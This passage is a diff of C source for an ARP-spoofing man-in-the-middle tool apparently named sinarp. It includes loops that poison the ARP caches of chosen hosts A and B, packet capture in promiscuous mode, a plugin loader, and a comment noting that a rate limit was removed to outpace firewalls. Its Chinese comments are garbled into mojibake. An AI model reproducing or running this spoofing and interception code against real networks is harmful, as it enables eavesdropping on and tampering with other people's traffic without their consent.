-                //¸æËß¡¡A ÎÒÊÇ B
-                for (i = 0;i < 0xFF ;i++)
+                if (g_HostList[i].type == HOST_A && g_HostList[i].active == 1)
                 {
-                    if(g_HostList[i].type == HOST_A && g_HostList[i].active == 1)
+                    for (j = 0 ; j < 0xFF; j++)
                     {
-                        for (j = 0 ;j < 0xFF;j++)
+                        if (g_HostList[j].type == HOST_B && g_HostList[j].active == 1)
                         {
-                            if(g_HostList[j].type == HOST_B && g_HostList[j].active == 1)
-                            {
-                                sinarp_arp_spoof(g_HostList[i].ip,g_HostList[i].mac,g_HostList[j].ip,g_my_mac);
-                            }
-                        }
-                    }
-                }
-                //¸æËß B¡¡ÎÒÊÇ¡¡A
-                for (i = 0;i < 0xFF ;i++)
-                {
-                    if(g_HostList[i].type == HOST_B && g_HostList[i].active == 1)
-                    {
-                        for (j = 0 ;j < 0xFF;j++)
-                        {
-                            if(g_HostList[j].type == HOST_A && g_HostList[j].active == 1)
-                            {
-                                sinarp_arp_spoof(g_HostList[i].ip,g_HostList[i].mac,g_HostList[j].ip,g_my_mac);
-                            }
+                            sinarp_arp_spoof(g_HostList[i].ip, g_HostList[i].mac, g_HostList[j].ip, g_my_mac);
                         }
                     }
                 }
             }
-            break;
+            //å‘Šè¯‰ Bã€€æˆ‘æ˜¯ã€€A
+            for (i = 0; i < 0xFF ; i++)
+            {
+                if (g_HostList[i].type == HOST_B && g_HostList[i].active == 1)
+                {
+                    for (j = 0 ; j < 0xFF; j++)
+                    {
+                        if (g_HostList[j].type == HOST_A && g_HostList[j].active == 1)
+                        {
+                            sinarp_arp_spoof(g_HostList[i].ip, g_HostList[i].mac, g_HostList[j].ip, g_my_mac);
+                        }
+                    }
+                }
+            }
+        }
+        break;
         default:
             break;
         }
@@ -1504,7 +1508,8 @@ void * sinarp_spoof_thread(void *lparam)
 #else //Linux 
         Sleep(g_interval);
 #endif
-    }while(g_is_time_shutdown == 0);
+    }
+    while (g_is_time_shutdown == 0);
     g_is_spoof_thread_active = 0;
     return 0;
 }
@@ -1518,7 +1523,7 @@ DWORD _stdcall sinarp_capture_thread(void *lparam)
     return 0;
 }
 #else
-void *  sinarp_capture_thread(void *lparam)
+void   *sinarp_capture_thread(void *lparam)
 {
     g_is_capture_thread_active = 1;
     sinarp_do_capture();
@@ -1528,19 +1533,19 @@ void *  sinarp_capture_thread(void *lparam)
 #endif
 
 #ifdef WIN32
-void sinarp_create_thread(DWORD  (__stdcall *func)(void *),void *lparam)
+void sinarp_create_thread(DWORD  (__stdcall *func)(void *), void *lparam)
 {
-    CreateThread(NULL,0,func,lparam,0,NULL);
+    CreateThread(NULL, 0, func, lparam, 0, NULL);
 }
 #else //for Linux 
-void sinarp_create_thread(void* ( *func)(void *),void *lparam)
+void sinarp_create_thread(void * ( *func)(void *), void *lparam)
 {
     //CreateThread(NULL,0,func,lparam,0,NULL);
     pthread_t thread_id;
     pthread_attr_t attr;
     pthread_attr_init(&attr);
-    pthread_attr_setdetachstate(&attr,PTHREAD_CREATE_DETACHED);
-    pthread_create(&thread_id,&attr,func,lparam);
+    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
+    pthread_create(&thread_id, &attr, func, lparam);
     pthread_attr_destroy(&attr);
 }
 #endif
@@ -1550,35 +1555,35 @@ void sinarp_create_thread(void* ( *func)(void *),void *lparam)
 int ctrlc = 0;
 
 BOOL WINAPI HandlerRoutine(DWORD fdwCtrlType)
-{ 
-    switch (fdwCtrlType) 
-    { 
-        // Handle the CTRL-C signal. 
-    case CTRL_C_EVENT: 
-    case CTRL_CLOSE_EVENT: 
-    case CTRL_BREAK_EVENT:  
-    case CTRL_LOGOFF_EVENT: 
+{
+    switch (fdwCtrlType)
+    {
+        // Handle the CTRL-C signal.
+    case CTRL_C_EVENT:
+    case CTRL_CLOSE_EVENT:
+    case CTRL_BREAK_EVENT:
+    case CTRL_LOGOFF_EVENT:
     case CTRL_SHUTDOWN_EVENT:
         ctrlc++;
-        if(ctrlc == 2)
+        if (ctrlc == 2)
             return FALSE;
-        if(ctrlc == 3)
+        if (ctrlc == 3)
             exit(88);
-        printf("\r\nCtrl+C Is Pressed.\r\n"); // Ç°ÃæµÄ \n ÊÇ±ÜÃâÊä³ö»ìÂÒ ~~
+        printf("\r\nCtrl+C Is Pressed.\r\n"); // å‰é¢çš„ \n æ˜¯é¿å…è¾“å‡ºæ··ä¹± ~~
         Sleep(200);
-        g_is_time_shutdown = 1; //Í¨ÖªÏß³ÌÍË³ö¡£¡£¡£¡£
+        g_is_time_shutdown = 1; //é€šçŸ¥çº¿ç¨‹é€€å‡ºã€‚ã€‚ã€‚ã€‚
         pf_pcap_breakloop(g_adhandle);
-        return TRUE; //²»´ÓÕâÀïÍË³ö 		
-    default: 
-        return FALSE; 
+        return TRUE; //ä¸ä»è¿™é‡Œé€€å‡º
+    default:
+        return FALSE;
     }
 }
 #else
 void  cleanup(int s)
 {
-    printf("\r\nCtrl+C Is Pressed.\r\n"); // Ç°ÃæµÄ \n ÊÇ±ÜÃâÊä³ö»ìÂÒ ~~
+    printf("\r\nCtrl+C Is Pressed.\r\n"); // å‰é¢çš„ \n æ˜¯é¿å…è¾“å‡ºæ··ä¹± ~~
     Sleep(200);
-    g_is_time_shutdown = 1; //Í¨ÖªÏß³ÌÍË³ö¡£¡£¡£¡£
+    g_is_time_shutdown = 1; //é€šçŸ¥çº¿ç¨‹é€€å‡ºã€‚ã€‚ã€‚ã€‚
     pf_pcap_breakloop(g_adhandle);
     Sleep(2500);
 }
@@ -1586,58 +1591,58 @@ void  cleanup(int s)
 
 void sinarp_restore_arp_table()
 {
-    //´ÓÖ÷»úÁĞ±íÀïÃæÈ¡³öÕıÈ·µÄ ip ¶ÔÓ¦µÄ mac
-    int i,j;
-    switch(g_spoof_type)
+    //ä»ä¸»æœºåˆ—è¡¨é‡Œé¢å–å‡ºæ­£ç¡®çš„ ip å¯¹åº”çš„ mac
+    int i, j;
+    switch (g_spoof_type)
     {
     case SPOOF_A:
+    {
+        for (i = 0; i < 0xFF ; i++)
         {
-            for (i = 0;i < 0xFF ;i++)
+            if (g_HostList[i].type == HOST_A && g_HostList[i].active == 1)
             {
-                if(g_HostList[i].type == HOST_A && g_HostList[i].active == 1)
+                for (j = 0 ; j < 0xFF; j++)
                 {
-                    for (j = 0 ;j < 0xFF;j++)
+                    if (g_HostList[j].type == HOST_B && g_HostList[j].active == 1)
                     {
-                        if(g_HostList[j].type == HOST_B && g_HostList[j].active == 1)
-                        {
-                            sinarp_arp_spoof(g_HostList[i].ip,g_HostList[i].mac,g_HostList[j].ip,g_HostList[j].mac);
-                        }
+                        sinarp_arp_spoof(g_HostList[i].ip, g_HostList[i].mac, g_HostList[j].ip, g_HostList[j].mac);
                     }
                 }
             }
         }
-        break;
+    }
+    break;
     case SPOOF_AB:
+    {
+        for (i = 0; i < 0xFF ; i++)
         {
-            for (i = 0;i < 0xFF ;i++)
+            if (g_HostList[i].type == HOST_A && g_HostList[i].active == 1)
             {
-                if(g_HostList[i].type == HOST_A && g_HostList[i].active == 1)
+                for (j = 0 ; j < 0xFF; j++)
                 {
-                    for (j = 0 ;j < 0xFF;j++)
+                    if (g_HostList[j].type == HOST_B && g_HostList[j].active == 1)
                     {
-                        if(g_HostList[j].type == HOST_B && g_HostList[j].active == 1)
-                        {
-                            sinarp_arp_spoof(g_HostList[i].ip,g_HostList[i].mac,g_HostList[j].ip,g_HostList[j].mac);
-                        }
-                    }
-                }
-            }
-            //¸æËß B¡¡ÎÒÊÇ¡¡A
-            for (i = 0;i < 0xFF ;i++)
-            {
-                if(g_HostList[i].type == HOST_B && g_HostList[i].active == 1)
-                {
-                    for (j = 0 ;j < 0xFF;j++)
-                    {
-                        if(g_HostList[j].type == HOST_A && g_HostList[j].active == 1)
-                        {
-                            sinarp_arp_spoof(g_HostList[i].ip,g_HostList[i].mac,g_HostList[j].ip,g_HostList[j].mac);
-                        }
+                        sinarp_arp_spoof(g_HostList[i].ip, g_HostList[i].mac, g_HostList[j].ip, g_HostList[j].mac);
                     }
                 }
             }
         }
-        break;
+        //å‘Šè¯‰ Bã€€æˆ‘æ˜¯ã€€A
+        for (i = 0; i < 0xFF ; i++)
+        {
+            if (g_HostList[i].type == HOST_B && g_HostList[i].active == 1)
+            {
+                for (j = 0 ; j < 0xFF; j++)
+                {
+                    if (g_HostList[j].type == HOST_A && g_HostList[j].active == 1)
+                    {
+                        sinarp_arp_spoof(g_HostList[i].ip, g_HostList[i].mac, g_HostList[j].ip, g_HostList[j].mac);
+                    }
+                }
+            }
+        }
+    }
+    break;
     default:
         break;
     }
@@ -1647,63 +1652,63 @@ void sinarp_parse_plugin_string(const char *plugin_string)
 {
     char buff[256];
     const char *p = plugin_string;
-    while((p = sinarp_take_out_string_by_char(p,buff,256,',')))
+    while ((p = sinarp_take_out_string_by_char(p, buff, 256, ',')))
     {
-        if(FALSE == sinarp_load_plugin(buff))
+        if (FALSE == sinarp_load_plugin(buff))
         {
-            sinarp_printf("Failed to load plugin %s !\n",buff);
+            sinarp_printf("Failed to load plugin %s !\n", buff);
         }
     }
 }
 
 
 /*=======================================
-from NetFuke src 
-Name:	b_FindStringByFlag
-Usage:	È¡µÃ±ê¼ÇÖĞ¼äµÄ×Ö·û´®
-ÈëÁ¦1:	×Ö·û´®Ö¸Õë
-ÈëÁ¦1:	±êÖ¾1
-ÈëÁ¦1:	±êÖ¾2
-ÈëÁ¦1:	Êä³ö»º³åÇø
-ÈëÁ¦2:	Êä³ö»º³åÇø´óĞ¡
-·µ»ØÖµ:	ÊÇ·ñÓĞÖµ
+from NetFuke src
+Name:   b_FindStringByFlag
+Usage:  å–å¾—æ ‡è®°ä¸­é—´çš„å­—ç¬¦ä¸²
+å…¥åŠ›1:    å­—ç¬¦ä¸²æŒ‡é’ˆ
+å…¥åŠ›1:    æ ‡å¿—1
+å…¥åŠ›1:    æ ‡å¿—2
+å…¥åŠ›1:    è¾“å‡ºç¼“å†²åŒº
+å…¥åŠ›2:    è¾“å‡ºç¼“å†²åŒºå¤§å°
+è¿”å›å€¼:  æ˜¯å¦æœ‰å€¼
 ========================================*/
 BOOL sinarp_find_string_by_flag(
-    const char*		p_szContent,
-    const char*		p_szFlag1,
-    const char*		p_szFlag2,
-    char*			p_szValue,
-    const uint32	i4_ValuseSize
-    )
+    const char     *p_szContent,
+    const char     *p_szFlag1,
+    const char     *p_szFlag2,
+    char           *p_szValue,
+    const uint32    i4_ValuseSize
+)
 {
-    char	szContent[65535];
-    char*	p_szFlag1Index	= NULL;
-    char*	p_szFlag2Index	= NULL;
+    char    szContent[65535];
+    char   *p_szFlag1Index  = NULL;
+    char   *p_szFlag2Index  = NULL;
 
-    // ÓĞĞ§ĞÔ¼ì²â
-    if( ( p_szContent == NULL ) || ( p_szValue == NULL ) )
+    // æœ‰æ•ˆæ€§æ£€æµ‹
+    if ( ( p_szContent == NULL ) || ( p_szValue == NULL ) )
     {
         return FALSE;
     }
 
-    // ±¸·İ×Ö·û´®
+    // å¤‡ä»½å­—ç¬¦ä¸²
     strcpy( szContent, p_szContent );
 
-    // ÕÒµ½µÚÒ»¸öFlag
+    // æ‰¾åˆ°ç¬¬ä¸€ä¸ªFlag
     p_szFlag1Index = strstr( szContent, p_szFlag1 );
 
-    if( p_szFlag1Index )
+    if ( p_szFlag1Index )
     {
-        // ÕÒµ½µÚ¶ş¸öFlag
+        // æ‰¾åˆ°ç¬¬äºŒä¸ªFlag
         p_szFlag1Index += strlen( p_szFlag1 );
         p_szFlag2Index = strstr( p_szFlag1Index, p_szFlag2 );
 
-        if( p_szFlag2Index )
+        if ( p_szFlag2Index )
         {
             *p_szFlag2Index = '\0';
 
-            // ³¤¶È¼ì²â
-            if( strlen( p_szFlag1Index ) >= i4_ValuseSize )
+            // é•¿åº¦æ£€æµ‹
+            if ( strlen( p_szFlag1Index ) >= i4_ValuseSize )
             {
                 strncpy( p_szValue , p_szFlag1Index, i4_ValuseSize - 1 );
             }
@@ -1729,48 +1734,235 @@ int setsignal(int sig, void (* func)(int))
     return (int)(old.sa_handler);
 }
 #endif
+
+char *sinarp_bin2hex(unsigned char *buff, int size)
+{
+    int i;
+    char tab[16] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'};
+    char *dest = (char *)malloc(size * 2 + 1);
+    for (i = 0 ; i < size; i++)
+    {
+        dest[i * 2] = tab[buff[i] >> 4];
+        dest[i * 2 + 1] = tab[buff[i] & 0x0F];
+    }
+    dest[size * 2] = 0;
+    return dest;
+}
+
+// convert ABCD... to \xAB\xCD
+unsigned char   *sinarp_hex2bin(char *hex, int len)
+{
+    int i;
+    unsigned char *Outbuff = (unsigned char *)malloc(len);
+    unsigned char  HexChar[256];
+    if (NULL == Outbuff)
+        return NULL;
+    memset(HexChar, 0, sizeof(HexChar));
+    HexChar[0] = '0';
+    HexChar[1] = '1';
+    HexChar[2] = '2';
+    HexChar[3] = '3';
+    HexChar[4] = '4';
+    HexChar[5] = '5';
+    HexChar[6] = '6';
+    HexChar[7] = '7';
+    HexChar[8] = '8';
+    HexChar[9] = '9';
+    HexChar[0xA] = 'A';
+    HexChar[0xB] = 'B';
+    HexChar[0xC] = 'C';
+    HexChar[0xD] = 'D';
+    HexChar[0xE] = 'E';
+    HexChar[0xF] = 'F';
+    HexChar['0'] = 0;
+    HexChar['1'] = 1;
+    HexChar['2'] = 2;
+    HexChar['3'] = 3;
+    HexChar['4'] = 4;
+    HexChar['5'] = 5;
+    HexChar['6'] = 6;
+    HexChar['7'] = 7;
+    HexChar['8'] = 8;
+    HexChar['9'] = 9;
+    HexChar['A'] = 0xA;
+    HexChar['B'] = 0xB;
+    HexChar['C'] = 0xC;
+    HexChar['D'] = 0xD;
+    HexChar['E'] = 0xE;
+    HexChar['F'] = 0xF;
+    HexChar['a'] = 0xA;
+    HexChar['b'] = 0xB;
+    HexChar['c'] = 0xC;
+    HexChar['d'] = 0xD;
+    HexChar['e'] = 0xE;
+    HexChar['f'] = 0xF;
+
+    for (i = 0; i < len; i += 2)
+    {
+        unsigned char a = hex[i];
+        unsigned char b = hex[i + 1];
+        if ((0 == a && '0' != a) || (0 == b && '0' != hex[i + 1]))
+        {
+            break;
+        }
+        Outbuff[i / 2] = (HexChar[a] << 4) + HexChar[b];
+    }
+    if (i < len)
+    {
+        free(Outbuff);
+        return NULL;
+    }
+    return Outbuff;
+}
+
+void strupr (char *str)
+{
+    while (*str)
+    {
+        *str = toupper (*str) ;
+        str ++ ;
+    }
+}
+
+//http://www.linuxmisc.com/18-writing-Linux-applications/aa7b8b9675a92ec7.htm
+
+// convert ab:cd:ef:12:34:56 to  \xAB\xCD\xEF\x12\x34\x56
+int sinarp_mac_from_string(char *str, char mac[6])
+{
+    int i = 0;
+    char *p = str;
+    char mac_str[32];
+    unsigned char *pmac ;
+    memset(mac_str, 0, sizeof(mac_str));
+    //strncpy(p,str,32);
+    while (*p)
+    {
+        if (*p != ':')
+        {
+            mac_str[i] = *p;
+            ++i;
+        }
+        p++;
+    }
+    strupr(mac_str);
+    pmac = sinarp_hex2bin(mac_str, strlen(mac_str));
+    if (NULL == mac)
+    {
+        DBG_MSG("%s:bin2hex failed !!", __func__);
+        return 0;
+    }
+    memcpy(mac, pmac, 6);
+    free(pmac);
+    return 1;
+}
+
+int sinarp_add_host_list(uint32 ip, unsigned char mac[6])
+{
+    if ((ip & 0x00FFFFFF) == (g_my_ip & 0x00FFFFFF))
+    {
+        memcpy(g_HostList[ip >> 24].mac, mac, 6);
+        g_HostList[ip >> 24].active = 1;
+        g_HostList[ip >> 24].ip = ip;
+        return 1;
+    }
+    return 0;
+}
+
+void sinarp_process_mac_string(char *mac_string)
+{
+    const char *p = mac_string;
+    char buff[256];
+    char ip[32];
+    unsigned char mac[6];
+    char *pmac;
+    uint32 uip;
+    char *slash;
+
+    while ((p = sinarp_take_out_string_by_char(p, buff, 256, ',')))
+    {
+        if ((slash = strchr(buff, '-'))) //12.12.12.12/24
+        {
+            memset(ip,0,sizeof(ip));
+            strncpy(ip, buff, slash - buff );
+            pmac = slash + 1;
+            if (sinarp_mac_from_string(pmac, (char *)mac))
+            {
+                uip = inet_addr(ip);
+                if (0 != uip)
+                {
+                    DBG_MSG("%s:ip:%s mac %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n",
+                            __func__,
+                            ip,
+                            mac[0],
+                            mac[1],
+                            mac[2],
+                            mac[3],
+                            mac[4],
+                            mac[5]);
+                    if (0 == sinarp_add_host_list(uip, mac))
+                    {
+                        DBG_MSG("%s: add to host list failed !", __func__);
+                    }
+                }
+            }
+            else
+            {
+                DBG_MSG("%s get mac failed \n",__func__);
+            }
+        }
+    }
+}
+
 /*
 sinarp -i 0 -A 12,3,4,22,31,54 -B 123,11,234
 */
 
-int  main(int argc ,char ** argv)
+int  main(int argc , char **argv)
 {
     uint32 idx = 0;
     uint32 host_count = 0;
-    uint32 active_count_A,active_count_B;
+    uint32 active_count_A, active_count_B;
     uint32 M_ip = 0;
     pcap_addr_t *a;
     uint32 i;
     struct bpf_program fcode;
-    pcap_if_t *pdevs,*open_devs;
+    pcap_if_t *pdevs, *open_devs;
     char errbuf[PCAP_ERRBUF_SIZE];
     char sniffer_filter[256];
-	char *plugin_string = NULL;//ÏÈ±£´æ ²å¼ş×Ö·û´® µÈÒ»Ğ©È«¾Ö±äÁ¿¶¼³õÊ¼»¯ºÃÁË ÔÙ¼ÓÔØ²å¼ş
-//	char cwd[4096];
-	pdevs = open_devs = NULL;
+    char *plugin_string = NULL;//å…ˆä¿å­˜ æ’ä»¶å­—ç¬¦ä¸² ç­‰ä¸€äº›å…¨å±€å˜é‡éƒ½åˆå§‹åŒ–å¥½äº† å†åŠ è½½æ’ä»¶
+    char *mac_string = NULL;
+    //  char cwd[4096];
+    pdevs = open_devs = NULL;
 #ifndef WIN32
-    setvbuf(stdout, NULL, _IOLBF, 0);
+    setvbuf(stdout, NULL, _IOLBF, 0);  // no effect ??? !!!
 #endif
-// 	getcwd(cwd,4096);
-// 	printf("%s\n",cwd);
-// 	if(-1 == setenv("LD_LIBRARY_PATH",cwd,1))
-// 	{
-// 		perror("setenv():");
-// 	}
-// 	printf("%s\n",getenv("LD_LIBRARY_PATH"));  //Êµ¼ùÖ¤Ã÷ÕâÑùÉèÖÃÊ±Ã»ÓĞÓÃµÄ¡£¡£
-
-
-    sinarp_copyright_msg(); //°æÈ¨ĞÅÏ¢
-    if(!sinarp_init_pcap_funcs())
+#ifdef WIN32
+    SetConsoleCtrlHandler(HandlerRoutine, TRUE);
+#else
+    (void)setsignal(SIGPIPE, cleanup);
+    (void)setsignal(SIGTERM, cleanup);
+    (void)setsignal(SIGINT, cleanup);
+#endif
+    // init global val
+    memset(g_HostList, 0, sizeof(g_HostList));
+    //  getcwd(cwd,4096);
+    //  printf("%s\n",cwd);
+    //  if(-1 == setenv("LD_LIBRARY_PATH",cwd,1))
+    //  {
+    //      perror("setenv():");
+    //  }
+    //  printf("%s\n",getenv("LD_LIBRARY_PATH"));  //å®è·µè¯æ˜è¿™æ ·è®¾ç½®æ—¶æ²¡æœ‰ç”¨çš„ã€‚ã€‚
+    sinarp_copyright_msg(); //ç‰ˆæƒä¿¡æ¯
+    if (!sinarp_init_pcap_funcs())
     {
         printf("init winpcap failed !\n");
         return -1;
     }
-    if(argc < 2)
+    if (argc < 2)
     {
         sinarp_show_help_msg();
         pdevs = sinarp_get_ifs();
-        if(pdevs == NULL)
+        if (pdevs == NULL)
         {
             printf("Failed to get the adapter information~~\n");
             return -1;
@@ -1780,52 +1972,56 @@ int  main(int argc ,char ** argv)
         return 0;
     }
 
-    for (idx = 2 ;idx <= argc ;idx ++)
+    for (idx = 2 ; idx <= argc ; idx ++)
     {
-        if(stricmp(argv[idx-1],"-A")==0)
+        if (stricmp(argv[idx - 1], "-A") == 0)
         {
-            sinarp_parse_host_string(argv[idx],HOST_A);
-        }else if (stricmp(argv[idx-1],"-M")==0)
+            sinarp_parse_host_string(argv[idx], HOST_A);
+        }
+        else if (stricmp(argv[idx - 1], "-M") == 0)
         {
-            //¸ù¾İÖĞ¼äÈËµÄip À´È·¶¨ ip µÄÇ°3Î»  netmask ¶¨ËÀÎª 255.255.255.0
+            //æ ¹æ®ä¸­é—´äººçš„ip æ¥ç¡®å®š ip çš„å‰3ä½  netmask å®šæ­»ä¸º 255.255.255.0
             M_ip = sinarp_hostname_to_ip(argv[idx]);
-            if(M_ip == 0)
+            if (M_ip == 0)
             {
-                printf("unknown M host : %s\n",argv[idx]);
+                sinarp_printf("unknown M host : %s\n", argv[idx]);
                 goto clean;
             }
-        }else if(stricmp(argv[idx-1],"-B")==0)
+        }
+        else if (stricmp(argv[idx - 1], "-B") == 0)
         {
-            sinarp_parse_host_string(argv[idx],HOST_B);
-        }else if(stricmp(argv[idx-1],"-i")==0)
+            sinarp_parse_host_string(argv[idx], HOST_B);
+        }
+        else if (stricmp(argv[idx - 1], "-i") == 0)
         {
             pdevs = sinarp_get_ifs();
-            open_devs = sinarp_get_if_by_id(pdevs,(uint32)atoi(argv[idx]));
-            if(!open_devs)
+            open_devs = sinarp_get_if_by_id(pdevs, (uint32)atoi(argv[idx]));
+            if (!open_devs)
             {
-                printf("pleaser input a right id !\n");
+                sinarp_printf("pleaser input a right id !\n");
                 goto clean;
             }
-            printf("use Interfaces : %s\n",open_devs->name);
-            if((g_adhandle = pf_pcap_open_live(open_devs->name, // device 
-                65536,     // portion of the packet to capture.
-                // 65536 grants that the whole packet will be captured on all the MACs.
-                1,       // promiscuous mode 
-                1, //a value of 0 means no time out
-                errbuf     // error buffer
-                )) == NULL)
+            sinarp_printf("use Interfaces : %s\n", open_devs->name);
+            if ((g_adhandle = pf_pcap_open_live(open_devs->name, // device
+                                                65536,     // portion of the packet to capture.
+                                                // 65536 grants that the whole packet will be captured on all the MACs.
+                                                1,       // promiscuous mode
+                                                1, //a value of 0 means no time out
+                                                errbuf     // error buffer
+                                               )) == NULL)
             {
                 sinarp_printf("\r\nUnable to open the adapter. \
                               %s is not supported by WinPcap\r\n", open_devs->description);
                 goto clean;
             }
 
-			strncpy(g_opened_if_name,open_devs->name,255);
-            //Ò»¿éÍø¿¨ÉÏÃæ¿ÉÄÜ°ó¶¨¶à¸öIP¡£ ¶øÎÒÃÇÃ¿´ÎÖ»ÄÜÊ¹ÓÃÆäÖĞµÄÒ»¸ö
+            strncpy(g_opened_if_name, open_devs->name, 255);
+            //ä¸€å—ç½‘å¡ä¸Šé¢å¯èƒ½ç»‘å®šå¤šä¸ªIPã€‚ è€Œæˆ‘ä»¬æ¯æ¬¡åªèƒ½ä½¿ç”¨å…¶ä¸­çš„ä¸€ä¸ª
 
-        }else if(stricmp(argv[idx-1],"-s")==0)
+        }
+        else if (stricmp(argv[idx - 1], "-s") == 0)
         {
-            switch(atoi(argv[idx]))
+            switch (atoi(argv[idx]))
             {
             case SPOOF_A:
                 g_spoof_type = SPOOF_A;
@@ -1833,150 +2029,182 @@ int  main(int argc ,char ** argv)
             case SPOOF_AB:
                 g_spoof_type = SPOOF_AB;
                 break;
+            case 2:
+            {
+                g_spoof_type = SPOOF_NONE;
+            }
+            break;
             default:
                 sinarp_printf("unknown spoof type !\n");
                 goto clean;
             }
-        }else if(stricmp(argv[idx-1],"-p")==0)
+        }
+        else if (stricmp(argv[idx - 1], "-p") == 0)
         {
-			plugin_string = argv[idx];
+            plugin_string = argv[idx];
             //sinarp_parse_plugin_string(argv[idx]);
-        }else if(stricmp(argv[idx-1],"-t")==0)
+        }
+        else if (stricmp(argv[idx - 1], "-t") == 0)
         {
-            g_interval = atoi(argv[idx]); 
-            if(g_interval == 0)
+            g_interval = atoi(argv[idx]);
+            if (g_interval == 0)
             {
                 sinarp_printf("not a right interval ~~~\n");
                 goto clean;
             }
-            //	if(g_interval < 200)  //È¥µôÏŞÖÆ Ò»Ğ©·À»ğÇ½Ì« ¶ñĞÄÁË ÎÒ²»ÄÜ·¢°ü·¢µÄ±ÈËûÂı
-            //	{
-            //		printf("interval time  too short !\n");
-            //		goto clean;
-            //	}
-        }else if(stricmp(argv[idx-1],"-f")==0)
+            //  if(g_interval < 200)  //å»æ‰é™åˆ¶ ä¸€äº›é˜²ç«å¢™å¤ª æ¶å¿ƒäº† æˆ‘ä¸èƒ½å‘åŒ…å‘çš„æ¯”ä»–æ…¢
+            //  {
+            //      printf("interval time  too short !\n");
+            //      goto clean;
+            //  }
+        }
+        else if (stricmp(argv[idx - 1], "-f") == 0)
         {
-            //ÕÒµ½µÄ»° ÄÇÃ´¾Í¹Ø±Õ ip ×ª·¢¹¦ÄÜ 
+            //æ‰¾åˆ°çš„è¯ é‚£ä¹ˆå°±å…³é—­ ip è½¬å‘åŠŸèƒ½
             g_auto_ip_forward = 0;
+        }
+        else if (stricmp(argv[idx - 1], "--mac") == 0)
+        {
+            mac_string = argv[idx];
         }
     }
     //
-    if(!open_devs)
+    if (!open_devs)
     {
-        //ÓÃ»§Ã»ÓĞÖ¸¶¨Íø¿¨
-        printf("please input the adapter id£¡\n");
-        //printf("ÇëÖ¸¶¨Òª´ò¿ªµÄÍø¿¨£¡\n");
+        //ç”¨æˆ·æ²¡æœ‰æŒ‡å®šç½‘å¡
+        sinarp_printf("please input the adapter idï¼\n");
+        //printf("è¯·æŒ‡å®šè¦æ‰“å¼€çš„ç½‘å¡ï¼\n");
         goto clean;
     }
-
-    //check M 
-    if(M_ip)
+    //
+    if (SPOOF_NONE == g_spoof_type)
     {
-        //¿´¿´ÖĞ¼äÈËµÄ ip ÊÇ²»ÊÇÔÚÍø¿¨µÄipÁĞ±íÀïÃæ
-        /* IP addresses */
-        for(a=open_devs->addresses;a;a=a->next) 
+        //å¯åŠ¨æ•è·çº¿ç¨‹ ï¼Œåœ¨æ•è·çº¿ç¨‹é‡Œé¢ å¦‚æœ æœ‰ä¸»æœºå‘æˆ‘ä»¬å›å¤ ARP è¯·æ±‚çš„è¯ é‚£ä¹ˆæˆ‘ä»¬å°±æ›´æ–°æˆ‘ä»¬çš„ä¸»æœºè¡¨é‡Œé¢çš„ MACã€€ä¿¡æ¯
+        sinarp_create_thread(sinarp_capture_thread, NULL);
+        Sleep(2000);
+        // entry loop
+        //ç­‰å¾…è¿™ä¸¤ä¸ªçº¿ç¨‹é€€å‡ºå§ã€‚ã€‚ã€‚
+        while (g_is_capture_thread_active)
         {
-            switch(a->addr->sa_family)
+            Sleep(100);
+#ifdef WIN32
+            sinarp_printf("\rprocessed packet %I64u", g_packet_count);
+#else
+            sinarp_printf("\rprocessed packet %llu", g_packet_count);
+#endif
+        }
+        goto clean;
+    }
+    //check M
+    if (M_ip)
+    {
+        //çœ‹çœ‹ä¸­é—´äººçš„ ip æ˜¯ä¸æ˜¯åœ¨ç½‘å¡çš„ipåˆ—è¡¨é‡Œé¢
+        /* IP addresses */
+        for (a = open_devs->addresses; a; a = a->next)
+        {
+            switch (a->addr->sa_family)
             {
             case AF_INET:
                 if (a->addr)
-                    if(M_ip == ((struct sockaddr_in *)a->addr)->sin_addr.s_addr)
+                    if (M_ip == ((struct sockaddr_in *)a->addr)->sin_addr.s_addr)
                     {
                         g_my_ip = M_ip;
-                        if(a->broadaddr)
+                        if (a->broadaddr)
                             g_my_boardcast_addr = ((struct sockaddr_in *)a->broadaddr)->sin_addr.s_addr;
-                        if(a->netmask)
+                        if (a->netmask)
                             g_my_netmask = ((struct sockaddr_in *)a->netmask)->sin_addr.s_addr;
-                        sinarp_get_gw_from_ip(g_my_ip,&g_my_gw_addr);
+                        sinarp_get_gw_from_ip(g_my_ip, &g_my_gw_addr);
 #ifdef WIN32
                         //printf("I am run in windows \n");
-                        sinarp_get_mac_from_if_name(strchr(open_devs->name,'{'),g_my_mac);
+                        sinarp_get_mac_from_if_name(strchr(open_devs->name, '{'), g_my_mac);
 #else
                         //printf(" I am run in linux \n");
-                        sinarp_get_mac_from_if_name(open_devs->name,g_my_mac);
+                        sinarp_get_mac_from_if_name(open_devs->name, g_my_mac);
 #endif
                     }
-                    break;
-            case AF_INET6: //²»Ö§³Ö ipv6
+                break;
+            case AF_INET6: //ä¸æ”¯æŒ ipv6
                 break;
             default:
                 break;
             }
-            if(g_my_ip)
+            if (g_my_ip)
                 break;
         }
-        if(!g_my_ip)
+        if (!g_my_ip)
         {
-            //ip µØÖ·²»ÔÚÍø¿¨ÁĞ±íÀïÃæ
-            printf("the M ip : %s invaild!\n",inet_ntoa(*(struct in_addr *)&M_ip));
+            //ip åœ°å€ä¸åœ¨ç½‘å¡åˆ—è¡¨é‡Œé¢
+            printf("the M ip : %s invaild!\n", inet_ntoa(*(struct in_addr *)&M_ip));
             goto clean;
         }
     }
     else
     {
-        //ÓÃ»§Ã»ÓĞÖ¸¶¨ÖĞ¼äÈËIP ÄÇÃ´È¡Íø¿¨µÄµÚÒ»¸öIP
-        for(a=open_devs->addresses;a;a=a->next) 
+        //ç”¨æˆ·æ²¡æœ‰æŒ‡å®šä¸­é—´äººIP é‚£ä¹ˆå–ç½‘å¡çš„ç¬¬ä¸€ä¸ªIP
+        for (a = open_devs->addresses; a; a = a->next)
         {
-            switch(a->addr->sa_family)
+            switch (a->addr->sa_family)
             {
             case AF_INET:
                 if (a->addr)
                     g_my_ip = ((struct sockaddr_in *)a->addr)->sin_addr.s_addr;
-                if(a->broadaddr)
+                if (a->broadaddr)
                     g_my_boardcast_addr = ((struct sockaddr_in *)a->broadaddr)->sin_addr.s_addr;
-                if(a->netmask)
+                if (a->netmask)
                     g_my_netmask = ((struct sockaddr_in *)a->netmask)->sin_addr.s_addr;
